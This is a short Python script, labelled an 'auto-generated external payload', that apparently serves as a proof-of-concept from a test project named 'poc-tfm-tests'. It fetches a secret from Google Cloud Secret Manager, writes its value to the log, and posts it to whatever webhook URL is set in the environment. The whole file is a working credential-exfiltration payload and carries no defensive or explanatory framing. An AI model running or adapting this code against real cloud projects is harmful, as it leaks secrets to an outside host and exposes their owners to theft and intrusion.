# auto-generated external payload
import os, logging, requests
from google.cloud import secretmanager

def main():
    logging.warning("[PAYLOAD] Starting external payload…")
    client = secretmanager.SecretManagerServiceClient()
    name = "projects/poc-tfm-tests/secrets/test-secret/versions/latest"
    value = client.access_secret_version(name=name).payload.data.decode("utf-8")
    logging.warning(f"[PAYLOAD] Retrieved secret: {value}")
    u = os.environ.get("WEBHOOK_URL")
    if u and u.startswith("http"):
        try:
            r = requests.post(u, json={"secret": value, "source": "ext-payload"})
            logging.warning(f"[PAYLOAD] POST to {u} -> {r.status_code}")
        except Exception as e:
            logging.warning(f"[PAYLOAD] POST error: {e}")
